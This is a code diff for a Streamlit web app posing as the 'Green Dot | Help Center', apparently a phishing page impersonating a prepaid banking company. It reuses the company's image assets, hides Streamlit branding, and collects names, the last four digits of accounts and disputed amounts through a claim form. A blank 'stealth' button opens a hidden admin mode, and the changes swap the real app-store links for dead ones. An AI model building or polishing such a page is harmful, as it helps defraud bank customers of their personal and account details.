@@ -29,7 +29,7 @@ st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page
 # --- UI SHIELD ---
 st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
-    .block-container { max-width: 500px !important; padding-top: 2rem !important; }
+    .block-container { max-width: 500px !important; padding-top: 2.5rem !important; }
 
     [data-testid='stHeader'], header, footer, .stDeployButton,
     .section-anchor, a.section-anchor,
@@ -40,20 +40,19 @@ st.markdown("""<style>
         visibility: hidden !important;
     }
 
-    /* OPTIMIZED LOGO CENTERING & SIZING */
+    /* LOGO SIZING & ALIGNMENT */
     [data-testid="stImage"] {
         display: flex !important;
         justify-content: center !important;
-        align-items: center !important;
         width: 100% !important;
-        margin: 20px auto !important;
+        margin: 10px auto 30px auto !important;
     }
     [data-testid="stImage"] img {
-        width: 280px !important; /* Increased for better presence */
+        width: 320px !important; /* Scale to match form presence */
         height: auto !important;
     }
     @media (max-width: 768px) {
-        [data-testid="stImage"] img { width: 180px !important; }
+        [data-testid="stImage"] img { width: 220px !important; }
     }
 
     .stButton > button {
@@ -62,7 +61,7 @@ st.markdown("""<style>
         border-radius: 8px !important;
         font-weight: 600 !important;
         width: 100% !important;
-        height: 45px !important;
+        height: 48px !important;
         border: none !important;
     }
 
@@ -76,17 +75,10 @@ st.markdown("""<style>
         font-size: 12px !important;
         color: #777 !important;
         text-align: center !important;
-        margin-top: 50px !important;
+        margin-top: 60px !important;
         padding: 30px 10px !important;
         border-top: 1px solid #222 !important;
         line-height: 1.7 !important;
-    }
-
-    .legal-container span, .legal-container div, .legal-container p {
-        background: transparent !important;
-        color: #777 !important;
-        border: none !important;
-        display: inline !important;
     }
 
     .stealth-trigger {
@@ -111,7 +103,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_8_8", clear_on_submit=True):
+    with st.form("claim_v32_8_9", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -122,17 +114,13 @@ if not st.session_state.admin_mode:
     st.markdown("""<div class='promo-box'>
         <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
         <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;'>
-            <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
-                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
-            </a>
-            <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
-                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
-            </a>
+            <a href='#'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'></a>
+            <a href='#'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'></a>
         </div>
     """, unsafe_allow_html=True)
 
     st.markdown("<div class='stealth-trigger'>", unsafe_allow_html=True)
-    if st.button(" ", key="stealth_admin_v88"): 
+    if st.button(" ", key="stealth_admin_v89"): 
         st.session_state.admin_mode = True
         st.rerun()
     st.markdown("</div></div>", unsafe_allow_html=True)
